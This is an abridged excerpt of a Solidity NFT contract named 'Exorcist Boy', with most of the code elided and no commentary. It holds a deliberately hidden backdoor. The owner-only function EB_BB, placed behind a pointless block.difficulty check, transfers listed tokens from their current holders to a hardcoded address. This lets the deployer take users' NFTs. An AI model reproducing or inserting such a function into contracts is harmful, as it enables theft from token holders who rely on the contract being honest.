...
contract Exorcist_Boy is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Exorcist Boy", "EB", maxBatchSize_, collectionSize_) {
  ...
  function EB_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x22e53D6063CDB26d69e192a9e863C99d89d2cBDd, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x94b0734cD6Cde8109145909178a6f75d9A6aA747);
